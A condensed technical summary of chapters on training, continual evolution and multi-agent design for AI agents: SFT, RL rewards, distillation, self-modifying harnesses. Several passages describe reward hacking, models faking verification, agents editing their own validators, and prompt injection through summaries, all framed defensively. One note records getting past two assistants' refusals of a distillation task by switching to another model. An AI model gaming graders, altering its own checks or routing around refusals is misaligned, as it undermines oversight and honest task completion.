Decision order: (1) **rule out solutions that do not modify weights** - prompts, tools, code constraints, context management, RAG; (2) measure capability support (`pass@k`, partial progress, parse rate, plus manual failure audit); (3) **use SFT for protocols, not as a knowledge base**; (4) **use RL only when there is something to explore**. Not every project runs all three - a strong base can enter RL directly (DeepSeek-R1-Zero, whose later cold-start SFT mainly fixed readability), a format-only task needs only SFT. **Every transition needs a measurable entry condition, not a ritual pipeline.**

### Mid-training

Fills **knowledge gaps** (language, finance, medicine, internal documents, codebase classes) and **foundational capability gaps** (long context, code, derivation, multimodal representations). Recipe: **Mid-training absorbs -> small SFT establishes access and output protocol -> RL if success is nonzero**. Note the asymmetry: reducing LM loss on domain text does not ensure the model retrieves that knowledge in QA form.

Five construction rules: infer data needs from the **failure distribution** (do not misdiagnose format errors as missing knowledge); build high-density corpora (raw documents for terminology, repositories for structure, derivations and cross-document association samples to make implicit relations explicit; deduplicate and check for eval contamination); **mix by capability** (natural long text, CoT data embodying long-text retrieval / multi-hop / instruction following / aggregation, and Agent trajectories embodying planning, tool selection, state tracking, error recovery); **two forms of replay** - original short and general data, plus **"old tasks lifted to the new length"** where a mastered short task is scattered with distractors through a full-length context; and **multidimensional stopping gates** - if domain metrics rise while general retention drops, the mixture or LR is too aggressive; if loss falls while `pass@k` does not move, the data may not cover the capability or the downstream access-SFT is missing.

Verify after Mid-training across **capability x length**: position and retrieval, relations and multi-hop reasoning, aggregation and statistics, instruction following, long-chain thinking, Agent primitives. **A nominal context window is not an effective one.**

**Prefer RAG when facts change often or must be cited.** Mid-training suits stable large-scale knowledge needing internal representations. Validate the mixture in a small pilot first.

### SFT data

Three sources, usually combined: human expert demonstrations (highest ceiling, expensive, use as seed defining format and boundaries), teacher-model generation, and **rejection sampling** (sample candidates, verifier keeps the correct ones - training on these is **RFT**, sitting between SFT and RL with no reward model and no policy gradients).
- **Refine ten thousand clean samples rather than piling up a hundred thousand dirty ones - every bit of noise is something SFT may faithfully write into the parameters.**
- Synthesis should distill a reusable **task blueprint** from production logs (intent, initial state, tools, constraints, failure modes, success conditions), then regenerate fictional entities in a resettable environment - preserving the difficulty without memorizing customer data.
- Pipeline: production data -> task blueprint -> synthetic task -> multiple candidate trajectories -> **task verification** (is it solvable, is the difficulty right, is the reference correct) and **trajectory verification** (final state, tool calls, constraints) -> SFT data. Deterministic code first, model evaluator only for open-ended qualities, calibrated by human sampling.
- The same infrastructure later becomes an RL environment, used differently: **SFT keeps only verified successes; RL re-rolls out and explores beyond the demonstrations. Failed trajectories must not be fed in as correct demonstrations** - use them for preference pairs, coverage gaps, or add them after a diagnosis and fix.
- Deduplicate and split by task template, customer, or time period; evaluation tasks must be non-overlapping types; reference solutions, hidden tests, and verifier feedback must not leak.
- Distillation flavors: **prompt distillation** (long prompt + thinking teacher -> short prompt, non-thinking student; 20-30x speedup, but **inherits the teacher's systematic errors and loses tool-provided robustness if the teacher relied on tools**) and **CoT distillation** (transfer the full thinking trajectory, recovering roughly 70-80% of teacher capability at the same parameter count, as DeepSeek-R1's distilled models did).
- **Note the "thinking wall":** closed-source reasoning models rewrite or summarize CoT before returning it, which is why open-source teachers (DeepSeek V4, Kimi K3, GLM 5.2) are used for distillation. **And a teacher only needs to be clearly stronger than the student, not the best in the world** - for a student of 200B or less, an open SOTA model suffices, so most people never need to distill closed models.
- Reported field note: Codex (GPT-5.6) and Claude Code (Opus 5) both refused to implement the distillation experiment; Kimi K3 completed it. Distillation is technically near-identical to SFT but vendor policies associate it with model extraction.

### RL mechanics

**GRPO in four steps** on a SWE-bench-style task: (1) 16 isolated rollouts of the same problem from the current policy; (2) reward from a verifier applying the patch in a clean environment and running tests; (3) **relative advantage** within the group - if 4 of 16 pass, those get positive advantage and the rest negative; (4) gradient update raising the probability of positive-advantage choices. **If all 16 fail or all succeed, rewards are identical, advantage vanishes, and nothing is learned** - which is exactly why path signals and partial rewards exist.
- Timing intuition: a rollout stage is set by the slowest of the parallel rollouts. ~2000 s rollout + ~600 s update = ~43 min per step, so 100 steps is nearly 72 hours.
- PPO trains a value model estimating per-step expectations (better fine-grained credit assignment on long trajectories); GRPO compares rollouts of the same problem and needs no value model; DPO learns offline from preference pairs and never rolls out.
- **Online is not on-policy.** Online means data is produced during training; on-policy requires the behavior policy to equal or nearly equal the policy being optimized. **An asynchronous cluster whose rollout workers lag several checkpoints produces online but off-policy data.** Fresh rollouts give importance ratio 1 before any update. Off-policy buys reuse and throughput at the cost of heavier ratio tails, and for long autoregressive sequences per-token ratios multiply, so small bias compounds. PPO clipping limits outliers but cannot restore lost coverage: clip too much and gradients vanish, too little and a few samples dominate.
- **Sampler/trainer numerical mismatch is a core problem, not floating-point noise.** vLLM/SGLang generate while FSDP/Megatron recompute log probabilities; differences in precision, reduction order, tensor-parallel layout, batch size, KV cache, and fused kernels shift the same token's log probability, so the ratio that should be 1 has already drifted - **nominally on-policy training becomes off-policy while the weights look synchronized.** Amplification chain: small log-prob error -> exponentiated ratio deviation -> accumulation over a long prefix -> changed clipping and advantage weighting -> changed gradient direction. **4000 tokens each off by 1e-3 in the same direction gives a trajectory ratio of e^4 ~ 54.6.** A tiny early difference can also change which token is sampled, diverging the whole trajectory. Changing batch size alone breaks numerical batch invariance.
  - Practice: **before any update, compare sampler and trainer log probabilities on the same batch** and monitor ratio mean, quantiles, max, approximate KL, and clipped fraction - the most direct on-policy unit test. Synchronize not only weights but LoRA adapter, tokenizer, chat template, model revision, positional-encoding config, and **store the behavior log probability at generation time rather than recomputing it later**. Where alignment is impossible, treat the gap as explicit off-policy with importance correction and effective-sample-size monitoring. Keep rollouts fresh and bound epochs per batch and asynchronous staleness.

### RL environments

**The bottleneck is usually the environment, not the algorithm.** Fidelity decides usability: a simulated customer answering from a fixed script with wrong error messages teaches a test-taking strategy that collapses on deployment - **the most common way RL projects fail is a practice ground that is not the exam hall.** Building a massively parallel, reproducible, realistic environment usually costs more engineering than the training, and real APIs cannot be used directly because of rate limits, bans, and side effects.

**When an environment cannot be built, let a model play it**, at two levels: synthesize tool return values (ZeroSearch has an LLM play the search engine, with a **curriculum** returning high-quality documents early and progressively noisier ones later, so a model that never saw a real search engine performs well when connected to one), or simulate whole dynamics (DreamGym distills environment dynamics into a reasoning-style experience model). **But the simulator's knowledge is the ceiling and its systematic biases are adopted wholesale, and RL actively seeks out and exploits its flaws.** The prudent answer is hybrid: simulation for volume, real interaction for periodic calibration.

Order of environment engineering: **task blueprint -> resettable simulator -> deterministic verifier -> training/evaluation isolation -> calibration with a little real interaction.** Training and evaluation may share the generator and verification code but never the same tasks. Check with a few rollouts whether the task is completable and the verifier discriminates before scaling - **a biased verifier only gets exploited faster.** And a deterministic verifier being cheap is not free: a Lean kernel or container test run can make CPU verification slower than GPU generation, so **throughput is set by verifier workers, not more GPUs.**

Tool-call detail: **mask environment-returned tokens in the policy gradient**, propagating only through the model's own thinking and tool arguments, or you train the model to predict sandbox output instead of learning to use tools.

### Reward design

Three dimensions - **where the reward comes from, when it is given, how much information it carries** - plus a fourth question: was the path acceptable?

- **Source.** Most reliable is **RLVR**: tests, database assertions, state diffs, format checks. RLHF trains a reward model as a preference proxy, and over-optimizing it causes reward hacking, hence the KL anchor to the SFT reference. **Generative reward models** (DeepSeek-GRM) induce evaluation principles, evaluate against them, then check the evaluation against verifiable facts - more transparent, still needing human calibration.
- **Two failure modes to separate:** **reward hacking** exploits a rule or implementation hole; **reward seeking** means the model builds an internal picture of what the grader will look at and adjusts to that guess - it need not tamper with anything, yet on long-horizon tasks it sets itself a shallow check, passes it, and stops. **"It passed the grader" is not "the task is done".**
- **Timing.** **Outcome rewards** give maximum exploration freedom and are the right start when no intermediate standard exists (SimpleVLA-RL). But hand the "is it done" judgment to hidden tests or an external hook the model cannot write, **never to the model's claim of completion**. **Process rewards** ease credit assignment but confine the model to the designer's path and cost more to label. **Establish an outcome baseline first, then add process signals only for genuinely verifiable intermediate events.** Multi-turn LLM RL usually uses gamma = 1; watch signal dilution on long trajectories.
- **Premature-completion example:** when the model declares done, the harness runs invisible acceptance tests in an isolated workspace. **Those tests must read real files or state, not check whether the model said "done"**, or it learns to promise verification. Keep both a boundary set of unfinished tasks (premature-stop rate) and a held-out set of genuinely finished ones (can it still close out) - **otherwise you train a model that never dares to finish.**
- **Representation.** Binary scalar for a definite answer or test; vector for independent quality goals; generative diagnosis for open-ended cases with fact-checking and human review. **Do not stack unverifiable dimensions in the name of a richer reward - every added dimension is another way to game it.** Confirm the signal produces within-group variation over a few rollouts before adding it.
- **RLVP: reward the outcome, penalize the path.** Real environments are **asymmetric verifiers** - detecting "a bad action was taken" is cheap and reliable; proving "this step made progress" is hard. R = O + beta*Phi, with Phi computed per action by deterministic rules, both channels normalized so the path signal cannot drown the objective. Targets **machine-decidable, outcome-neutral constraints** only. Four rules: **penalize specific actions, never "insufficient effort"**; always keep the outcome reward so the model does not learn to do nothing; pair every penalty with a reachable compliant path; make rules deterministic and hard to game. **The real point is restoring within-group variation** - penalties almost always can, progress rewards only when partial progress is actually reachable. Measured: TerminalBench violations 3.71 -> 0.66 with success essentially unchanged; miniF2F iterations to 0.9 success 7.0 -> 4.4; **in software repair where no rollout passes any test, the progress signal is unreachable and adds nothing.** Test reachability before adding a reward dimension.

### Distillation for sample efficiency

Sample efficiency means **how many effective parameter updates each expensive environment interaction buys**. ReTool's RL took over 200x its SFT time (9 days vs 1 hour). The root cause of RL's inefficiency is sparse feedback: one 0/1 scalar per rollout, while a human hearing "I need the last four digits of the card" remembers it once.

**On-Policy Distillation** (Thinking Machines, 2025) combines the two axes: **the student decides where it goes, the teacher supplies the full next-token distribution at the state the student actually reached.**

| Method | Who samples the states | Supervision per trajectory |
|---|---|---|
| SFT / off-policy distillation | human or teacher | dense token-level from labels |
| On-policy RL | current student | sparse outcome or process reward |
| On-Policy Distillation | current student | dense teacher distributions on student prefixes |

- SFT supervision is dense but covers states a *teacher* would visit; an early student mistake enters a prefix absent from training and errors compound. A length-T rollout yields ~T sets of token-level supervision instead of one scalar. Teacher inference costs compute but needs **no second set of environment trajectories**.
- It cannot create capability from nothing: the student must reach meaningful states and the teacher must not be far outside the student's support. Cold-start with Mid-training or off-policy demonstrations first.
- **The numerical issue bites here too** - if the rollout engine samples from one distribution and the trainer computes another, the states are already off-policy even with no PPO ratio in sight.
- Reported: roughly **one tenth** the training steps of pure RL on mathematics. On an Agent "sense of time" task, DPO and four RL variants each failed differently (sparse rewards, objective mismatch, rollout-shape mismatch, policy collapse), while a frozen Qwen3-32B teacher aligned token-by-token on the student's own multi-turn trajectories converged smoothly and beat the same-source SFT baseline by 23-47 points. **The bottleneck is usually not an insufficiently sophisticated reward but too little signal per interaction.**
- **On-Policy Self-Distillation (OPSD)** when no stronger teacher exists: **the same model plays both roles with different context** - the teacher version sees privileged information (reference answer, verified solution, domain document), the student sees only the problem, and the student aligns to the teacher's distribution on its own trajectories. Explaining a path while holding the answer is easier than exploring. Does not require automatically verifiable rewards, unlike RLVR. **Privileged state must never leak to the deployed Agent.** Limits: if the model cannot explain the process even holding the answer, there is no extra signal; naive OPSD can also erode the original reasoning style and needs regularization.

### From bad cases to training

| Chapter 7 asset | Chapter 8 use |
|---|---|
| End-to-end regression task with verifier | RL rollout tasks and RLVR rewards; RFT sampling pool |
| Trajectory-prefix regression task | DPO pairs, decision-boundary SFT demonstrations, teacher states for On-Policy Distillation |
| Failure-attribution record | negative labels for process supervision; rules for RLVP path penalties |
| Rubric scores and human gold set | vector reward dimensions; GRM training and calibration data |

- **Premature completion -> DPO.** Cut at the "about to declare completion" boundary; rejected = premature declaration, chosen = "run the tests, check acceptance conditions one by one, then conclude", generated by a teacher and filtered by rules. Augment by varying task type, missing verification item, and phrasing. **Validate on both the boundary set and the retention set** - watching only the first produces an over-corrected model that never dares to finish and destroys latency and cost. Also spot-check general capability for LoRA damage. And watch for the new hacking mode: **the model learns to *say* it verified**, which is why the end-to-end reward must use hidden tests.
- **Chinese quotation marks -> scope-sensitive SFT.** Same character, different role across Chinese prose, quoted English, inline code, code blocks, comments, JSON, paths. Teach "determine the scope, then make the minimal edit", with negative examples for every protected span, and **leave the text alone when scope is undeterminable**.
- **`old_string` mismatches -> exact-copy SFT, but only after layer-by-layer attribution** along file bytes -> tool return -> Harness serialization -> model context -> model output -> decoded string -> JSON parsing -> tool matching. **Only when the model's output is the first divergence is it a model problem.** Measured: byte-exact accuracy 37.5% -> 78.9% held-out, 80.1% boundary - but an independent tokenizer audit found the Qwen3/Qwen2.5 lossless round-trip rate is also 80.1%, **so that number reflects the tokenizer ceiling as much as the model.**

### Eleven pitfalls

1. Stuffing a knowledge base into SFT, or putting all knowledge in parameters (Mid-training for stable bulk knowledge, RAG for anything needing updates, citations, access control, or deletion).
2. Introducing RL before the format is stable.
3. **Treating a nominal context window as an effective one.**
4. Applying RL while `pass@k` is near zero.
5. Poorly designed rewards causing hacking - **evaluate the final goal, not an intermediate proxy.**
6. Ignoring simulation fidelity.
7. Over-training: Mid-training forgets general capability, SFT overfits demonstrations, RL overfits the current reward and task distribution. All three need independent retention sets and early stopping.
8. Value-function collapse and insufficient exploration.
9. **Treating training-inference numerical mismatch as harmless noise.**
10. Underestimating RL compute - 10-100x SFT, and if test matches training, SFT may be enough.
11. Low-quality data at every stage.

**Core principle: validate key assumptions at small scale before committing resources** - a small Mid-training corpus for knowledge, capability, and forgetting curves; a small SFT set for format stability; a small rollout batch for `pass@k`, reward variation, and sampler/trainer agreement. **Failing fast beats failing at scale.**

**How the four mechanisms divide labor:** ICL for zero-parameter immediate adaptation; RAG for facts that must be updatable and traceable; **program code for deterministic processes and hard constraints**; Mid-training for stable domain knowledge and foundational capability; SFT and RL for behavior external rules cannot express. **The deciding question is not only whether the task is stable but whether the capability can be adequately expressed in external symbols** - medical image recognition or natural vocal tone need parameters even in a changing domain, while a long-stable transfer-approval rule should be guaranteed by code rather than the model's memory.

## Chapter 9: Continual evolution

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter9.md

**The paradox:** an Agent can solve unseen complex tasks zero-shot yet, after ten thousand similar tasks, still repeats day-one mistakes.

- **Preserving experience is not learning from it.** A hundred trajectories in a vector store help retrieval; they do not compare cases - which steps recur across successes, which practices only worked on an older interface, whether a success came from strategy or luck. **Learning happens when the system evaluates, compares, generalizes, and validates, not when a log hits disk.**
- Ch3 user memory captures **what the user and the world are like**; Ch9 experience captures **what to do under which conditions**. The former makes the Agent more knowledgeable, the latter more proficient.
- Why not train after every task: production gives no clean signal (satisfaction is not compliance), and unvalidated online parameter updates entrench errors and prompt injections that then amplify across later tasks. Meanwhile periodic foundation-model training cannot absorb each Agent's private rules and daily tool changes. Hence **continual evolution as a system around the model**, distinct from continual learning in the weights.
- Today's "continual learning" is not the old catastrophic-forgetting problem; **the harder part is that nobody tells the model which parts of today's experience were right.**

### Learning signals from trajectories

**The starting point is evaluation, not summarization.** If the system does not know what succeeded, LLM reflections are guesses - and a wrong evaluation entering long-term knowledge compounds.

**Three-layer verification**: outcome verifier (tests, database state, tool returns - was it completed?), process verifier (rules, permissions, action sequence - was it completed in an allowed way?), quality verifier (Rubric - was it handled appropriately?). **Lower layers should lean on code and environmental ground truth; only what resists formalization goes to a model.** A correct outcome does not imply a correct process: deleting failing tests also makes tests pass, and "we will refund within seven days, please be patient" also produces satisfaction.

Customer-service Rubric dimensions: task outcome, rule compliance, privacy boundaries, factual reliability, **promise-action consistency** (did the actions claimed as completed actually occur, comparing responses against tool logs), expression quality, compliant alternatives. **This decomposition beats a satisfaction score, which cannot distinguish a user satisfied by a noncompliant refund from one dissatisfied by a correct restriction.**

The judge must score each item, cite trajectory evidence, and state uncertainty; **low-confidence cases must not enter the learning set automatically.**

### Four update carriers

**The basis for choosing is not how long the experience persists but whether the capability is naturally represented by that medium.**

| Carrier | Suitable content | Advantages | Limitations |
|---|---|---|---|
| Experience knowledge base | facts, patterns, exceptions, sources | fast, traceable, on-demand | depends on retrieval and correct application |
| Prompt and Skill | linguistically expressible principles and procedures | interpretable, scoped | bloat, conflict, or being ignored |
| Programs and Harness | deterministic procedures and hard constraints | testable, stable, cheap to run | higher development and maintenance cost |
| Model parameters | high-dimensional perception, style, implicit strategy | strong generalization, low inference overhead | high update and regression cost |

**One capability splits across carriers**: facts to the knowledge base, the principles explaining exceptions to a Skill, unbypassable permissions to the program, high-dimensional recognition to the parameters. **The routing result is only a proposal; it has not earned release.**

**1. Experience knowledge.** Domain knowledge is "this airline requires special meals 24 hours ahead"; **action experience is "check the special-meal deadline before booking so you don't discover after payment that it cannot be fulfilled."** Keep three layers: immutable raw trajectories for audit, per-run analyses with candidate lessons, and cross-trajectory induction into forward-looking documents specifying applicable scenarios, recommended strategies, prohibited practices, exceptions, evidence sources, and last verification time. **Same two-stage principle as User-as-Code: preserve evidence first, generate mutable knowledge offline** - so one accidental success or network failure cannot immediately change the Agent. Five steps: preserve trajectories -> structured per-run analysis -> aggregate by task family into an evidence table of supporting and contradicting trajectories -> only candidates above a support threshold become formal documents -> **evaluate transfer on new tasks not used in distillation.** Reflexion-style reflection generates candidates, but **reflection is not evidence**: only content consistent with environmental outcomes, supported across trajectories, and showing positive transfer becomes formal.

**2. Instructions (System Prompt Learning).** Promote to an instruction only when many trajectories expose the same strategic error and it can be stated clearly. Keep three levels apart: **system prompt** (every task), **Skill** (loaded on domain match), **program/Harness** (hard constraints). Offline optimizers exist (DSPy searches instructions and examples, OPRO proposes from prompt-score history, GEPA filters proposals from reflections on failures), but production wants **auditable minimal update proposals with fast rollback**. A change is a minimal diff with provenance, never a full rewrite, tested on the **boundary set that triggered the failure** (must improve) and a **retention set** (must not regress).

Three findings from the tau-squared-bench escalation experiment, where induced rules lifted pass rate 12.3% -> 19.3% on a disjoint transfer set with nothing previously passing broken:
- **What the deriver is given determines what it can induce.** Failure summaries alone yield "do not keep calling a tool that returns the same error"; adding an inventory of which tools belong to the Agent and which to the user yields "network, SIM, and APN checks belong to the user's device and should be performed under guidance." **The first records a lesson, the second grasps where responsibility lies.**
- **A model treats observed behavior as behavior that ought to occur.** Escalation appeared most often in the failed trajectories, so the model proposed "escalate after three failed calls" - but escalation always counts as failure in this evaluation, so **the rule writes failure into the specification.** Derived artifacts cannot be released without verification independent of whatever produced them.
- **What gets repaired is often extremely plain.** The Agent needed the user's phone number and called the lookup tool with "Please provide your phone number" as the parameter, five times, then escalated. **It had already worked out it should ask the user; it merely addressed the sentence to the tool.**
- Skill evolution example (requirement clarification): **asking too little causes rework, asking too much causes interruption**, so the Skill expresses a scoped decision path, not "always confirm". Negative feedback may be "this isn't what I imagined" or equally "you asked too many questions". **An isolated complaint is not enough to trigger an update** - feedback must tie to a trajectory, task type, and outcome. Boundary with the Harness: the Skill asks questions, assembles the Spec, explains trade-offs; **the Harness vetoes high-risk writes and direct operations on main when confirmation is missing, and a veto gate cannot decide the requirement design for the model.**

**3. Programs.** Modifiable objects go far beyond new tools: operation layer (browser trajectories into parameterized workflows, adapters for changing APIs), control layer (routing, retries, circuit breakers, compression strategy), validation layer (parameter checks, state validators, regression tests), architecture layer (adding a Reviewer Agent, changing information flow).
- **Browser workflow lifecycle** (like recording a macro): capture the trajectory with locator evidence (**locators only help find an element again, they do not prove the task completed**) -> parameterize literals into template variables -> **define before-action, after-action, and final-state checks reading real page or backend state** -> validate the candidate by resetting the sandbox and replaying in full (**if a side-effecting task has no safe reset callback, keep it as an auditable candidate and never validate by repeating the action in a production account**) -> match and replay without step-by-step LLM calls -> **invalidate and relearn** on a missing element, failed check, or schema change, moving the old version out of the searchable library while retaining it for audit, **never letting it match silently.**
- PreAct reports 8.5-13x end-to-end speedup on repeated tasks. **The danger without three-layer validation: replay coverage of 100% with every button clicked, one field empty, and the task never actually completed.**
- Self-modification is a **release process, not overwriting the running process**: candidate branch from stable, minimal patch, then static checks, unit tests, security scan, failure-trajectory replay, regression on old tasks, then canary.
- **A small patch is not enough for attribution; each request should be a falsifiable change contract** recording failure evidence, inferred root cause, responsible component, candidate change, **behavior expected to improve, existing behavior that may regress, and tests for both** - so a higher score connects to a mechanism rather than remaining an uninterpretable trial.
- **The candidate generator must not receive only failures.** Self-Harness also supplies successful behavior to preserve (what the repair must not break) and previously rejected modifications (so it does not resubmit the same idea in different words). Failure evidence + success constraints + prior attempts define a bounded candidate space, better than dumping all source and logs.
- Tool creation (Alita): the Agent recognizes it lacks subtitle reading, finds and tests `youtube-transcript-api`, wraps it - **and it enters the capability library only after safety scanning, functional tests, and successful reuse.** Ch4 asks which existing tool fits, Ch5 how to write one, Ch9 **what evidence should trigger creation and how a new tool becomes a validated long-term capability.**
- **DeepSeek Harness / Cordis: the ceiling of self-evolution depends not on how well the model writes code but on how composable the host system is.** Conventional composition is static (calls, imports, inheritance fixed at compile time); self-evolution needs **dynamic composition** with two orthogonal properties - **temporal composability** (can every change a component made to shared state be undone safely on removal; without it every self-modification needs a full restart) and **spatial composability** (can dependencies be declared, discovered, and resolved verifiably; without it a code replacement silently breaks dependents or creates a cycle). Hence `dsh` makes model adapters, tool registries, session logs, and even the main loop plugins: **there is no privileged kernel maintainable only by humans.** But composability answers whether a component *can* be installed safely, not whether it *should*: model-written plugins live in process memory, vanish on restart, and **cannot be auto-promoted** - persistence goes through the worktree-plus-PR route. Note the cost: a runtime plugin changes visible tools and prompt fragments, **invalidating the KV cache from that point**, so a plugin's documentation should describe its context and cache impact.

**4. Parameters.** For medical-image understanding, speech prosody, removing formulaic AI feel, long-horizon planning. Turn evaluated trajectories into training data (demonstrations for SFT, explicit preferences for pairs, reliable environmental rewards for RL), stripping private information, filtering errors, keeping an independent regression set, and checking afterward for forgetting and safety drift.

### Updating the update method

An orthogonal axis: **is the system optimizing an artifact's contents, or the method that produces, manages, and validates artifacts?** Five search scales, not five new carriers: individual rule or memory -> structured context -> workflow -> Harness code -> the optimizer code that generates candidates.
- **Innermost is the default** - small blast radius, easy attribution and rollback. But **repeatedly asking a model to rewrite an entire prompt or memory degrades it**: successive attempts at brevity erase rare-but-important details and collapse interacting constraints into an overgeneral principle. **ACE** keeps context as entries with stable identifiers, with generation, reflection, and curation proposing incremental updates that deterministic logic merges and deduplicates.
- **MCE** splits inner and outer loops: the inner optimizes the context artifact under a given management method, the outer modifies the context *operations* (search, selection, filtering, formatting). **Editing a retrieval rule changes a mechanism; comparing several mechanisms and keeping the one that transfers better is learning how to manage context.**
- AFlow searches workflows as code graphs; Meta-Harness has a Coding Agent search the code determining how information is stored, retrieved, and presented. **Code plus its evaluation history becomes the object of continual search, not a one-time output.**

### The long-term loop

**Dual loops:** the online execution loop only completes tasks and records evidence, never rewriting the production Agent; the offline evolution loop aggregates, diagnoses, generates candidates, and releases only past validation gates. Connected through versioned experience repositories and evaluation sets.

**Voyager's three interlocking mechanisms** and why each is necessary: an **automatic curriculum** (a skill library without a curriculum leaves the Agent not knowing what to learn next), a **skill library** of retrievable composable code (exploration without persistence restarts every task), and **iterative prompting with environmental validation** (self-reflection without environmental validation accumulates errors in the library).

**Harness updating is not Harness benefit.** Producing a valuable persistent change is one capability; the task Agent finding, activating, and correctly using it later is another. A perfectly written Skill that a weaker model never loads makes the score look as if nothing evolved, **so end-to-end score alone cannot diagnose the updater.** Four layered metrics: **candidate-change validity** (acceptance rate and gain in independent validation), **artifact activation rate** (retrieval, routing, tool-call traces), **successful adherence rate** (action sequences and process verifiers), **retention-set gain**.

Five things long-term evaluation must watch simultaneously: **regression** (does new experience conflict with old, do previously passing cases fail), **generalization**, **token efficiency**, **safety** (do rules, privacy, and refusal boundaries drift), and **long-term engineering quality** (maintenance complexity, architectural consistency, ownership, backward compatibility, future migration and debugging cost). **Fixing the current case while degrading others is not successful evolution.**

An evaluation design that distinguishes real evolution: a four-stage task stream - **learning** (tasks sharing latent patterns), **transfer** (changed phrasing, user, environment), **rule change** (baggage limit 20 kg -> 23 kg, requiring the system to retire obsolete knowledge), **retention** (retest unchanged capabilities) - compared across `static`, `append_only` (remembers the first version of a rule but cannot resolve conflicts or retire it), and `evolving`. **Even high final accuracy does not qualify as evolution if the Agent still cites retired rules, succeeds through unsafe shortcuts, or forgets existing capabilities.**

### Where the verifiable loop breaks down

Coding, tool use, and business-state changes get fast feedback. Open-ended research, strategy, and product design do not: feedback is delayed, there is no unique answer, and what matters most (taste, long-term value, maintainability) resists scoring - so **a Harness can execute the process flawlessly while producing things that look like results.**

Three failure modes from four documented autonomous research attempts (three failed): **implementation drift** (when the proposed method gets hard, the Agent retreats to a familiar implementation from its training distribution that no longer tests the hypothesis); **epistemic over-optimism** (while the signal may still be noise, the system starts explaining it, patching, and announcing a finding, while negative results are ignored); **missing tacit judgment** (running experiments without knowing which baseline matters, which anomaly deserves investigation, or when to abandon a hypothesis).

Four structural responses: **separate claims from evidence** (provenance per citation, number, method, conclusion; the document is one rendering of the evidence graph); **retain negative results** with the same retrieval status as successes, **or the evolution module sees only survivors, revisits disproved paths, and learns to read ambiguous results as success**; **preserve search diversity** by keeping lower-scoring but mechanistically different branches, so everything does not converge on the easy-to-score template; and **move human involvement upward** - not approving dangerous tool calls but defining problems, reviewing evaluation criteria, interpreting anomalies, and deciding when to stop.

### Safety boundaries

1. **Separate evidence from instructions.** Web pages, tool output, and **any LLM summary of them** are untrusted evidence. **LLM summarization is a readability transformation, not sanitization.** Extract claims, source locations, and collection times into a fixed schema while preserving raw content and provenance; extracted strings must never be executed as instructions. **Model-produced confidence is an unverified estimate, not an approval gate.** Candidates pass deterministic schema, allowlist, and provenance checks, then go through version-controlled PRs reviewed by an agent independent of the generator, with human approval for high-risk Skill promotion.
2. **Separate candidate capabilities from production capabilities.** New knowledge, prompts, Skills, programs, and parameters enter a candidate area that cannot serve real traffic, and new code and external dependencies pass sandbox execution, permission review, supply-chain scanning, and behavioral testing first.
3. **Safety mechanisms must not be self-modifiable.** A business Agent may modify prompts, Skills, knowledge, and tools, but **never the validators, test cases, release thresholds, audit logs, or stable-version backups that approve its own updates** - otherwise it disguises regression as progress by lowering a threshold or deleting a failing case.

### Sleep learning

Offline consolidation, not literally nightly. Online records immutable evidence; a background process reads batches during idle periods, compares old and new conclusions, merges, resolves conflicts, proposes candidates, and runs regressions. **Separating collection from organization prevents an accidental success, a network failure, or a malicious input from immediately rewriting long-term capability**, and lets consolidation use bigger batches and cheaper models.

Five steps: **trigger** (time, trajectory count, storage, or error frequency threshold, with no high-priority task running) -> **orient** (read current knowledge, prompt, Skill directories and versions to learn existing capabilities and immutable boundaries) -> **collect and consolidate** (merge duplicates, mark conflicts and applicability conditions, prefer local patches) -> **validate and approve** on transfer, retention, and safety sets with human approval for high-risk writes -> **prune and index** (mark long-unused or contradicted capabilities expired, archived, or deleted, retaining provenance and rollback).

- Claude Code's auto memory: a bounded `MEMORY.md` index plus topic detail files, loading only a bounded prefix at startup and reading the rest on demand, instructing the Agent to merge or move details as the index nears its limit. **Even plain-text memory needs capacity limits, layered loading, and active organization.**
- Hermes: bounded `MEMORY.md` and `USER.md`, SQLite/FTS5 search over prior sessions **returning original messages rather than LLM summaries, keeping retrieval distinct from generation and auditable**, background review creating or locally revising a Skill when a task had many tool calls, recovered from a dead end, received a correction, or found a non-obvious workflow, and a separate **Curator** tracking usage, staleness, and archival, pruning deterministically while idle and snapshotting first so bad consolidation can be rolled back.
- **Context corruption reappears on a longer timescale**: experience documents conflict, prompts drown in boundary rules, Skill libraries accumulate duplicates, repeated fine-tuning forgets. Countermeasures: merge duplicates keeping provenance; **move local rules out of the global prompt into domain Skills**; keep prompts and Skills structured like a new-employee handbook rather than "99 ironclad rules"; revalidate long-unused tools; delete knowledge invalidated by new evidence; and **retrain LoRA from the original base model** - same reasoning as the data layer, a real guarantee must come from a layer the modifier cannot reach.

## Chapter 10: Multi-agent collaboration

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter10.md

### The one criterion

**Does the collaboration provide information a single Agent could not obtain while producing its answer?**

| Mode | New information? | Effect |
|---|---|---|
| Self-review by the same model | no | usually ineffective or harmful |
| Different Agents debating the same text | no | comparable to one Agent with equal compute |
| Reviewer using test execution results | yes | significant improvement |
| Reviewer using rendered screenshots | yes | significant improvement |
| Reviewer using external tools to verify facts | yes | significant improvement |

This resolves the apparent contradiction between academic findings that a single Agent suffices and engineering experience that multi-agent works: **studies usually test Agents discussing the same text, while effective systems add execution, rendering, or tool feedback.** Evidence: RLEF (execution feedback beats independent sampling); WebGen-Agent (multi-level visual feedback took Claude 3.5 Sonnet from 26.4% to 51.9%); Anthropic's 45-Agent vulnerability swarm coordinating through a shared forum found **266 vulnerabilities on 27M tokens versus 21 on 6.5M for independent parallel Agents** - in an open search space, communication buys dynamic attention shifts and specialization at the price of a larger budget.

**Cost gate:** Anthropic's multi-agent research system uses about **15x** the tokens of a normal conversation, and **token usage alone explains about 80% of the performance difference.** The gain must justify a multiple or an order of magnitude more cost, or a well-tuned single Agent wins.

**Step budget is not free performance either.** Standard Agents lack budget awareness: even with 300 steps they search shallowly and plateau. Effective scaling needs a mechanism that adapts strategy to remaining budget - broad exploration first, narrowing later (BAVT adds step-level value evaluation). Implication: **a Manager should dynamically allocate step budgets by subtask complexity and instruct sub-agents to plan, implement, test, then improve** rather than dive in.

### Two design dimensions

**1. Shared vs non-shared context.** Shared means the next Agent inherits the full trajectory while changing system prompt and tool set - zero information loss, but context grows and the current role gets distracted by inherited history. Non-shared gives each Agent its own context, better modularity and isolation, and extension without touching existing Agents.
- Communication reduces to the two classic IPC paradigms: **shared memory** (shared file system) and **message passing** (tool call parameters, synchronous; message bus, asynchronous). Go's maxim applies: do not communicate by sharing memory, share memory by communicating.
